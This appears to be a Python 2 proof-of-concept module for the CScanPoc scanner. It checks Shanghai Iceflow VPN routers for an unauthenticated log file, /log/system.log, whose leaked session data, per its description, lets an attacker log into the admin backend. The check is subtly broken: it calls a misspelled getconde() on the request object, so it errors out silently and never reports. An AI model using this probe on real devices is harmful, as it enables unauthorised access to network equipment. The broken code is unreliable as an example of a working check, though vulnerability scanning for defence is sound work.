# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Iceflow_0006' # 平台漏洞编号，留空
    name = '上海冰峰VPN路由设备 直接登录'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-08-18'  # 漏洞公布时间
    desc = '''
        上海冰峰网络 VPN路由设备存在通用型设计缺陷(可实时利用登录系统)，
        由于“ICEFLOW VPN Router”设备产品存在各种日志文件未授权访问可导致系统敏感信息泄漏，
        根据日志信息获得session后，可利用实时登录系统管理后台。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '上海冰峰VPN路由设备'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b1519022-aa05-45d7-baf6-fdbbd086d50a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #from:http://www.wooyun.org/bugs/wooyun-2010-0134377
            payload = '/log/system.log'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if req.getconde() == 200 and 'login successfully' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
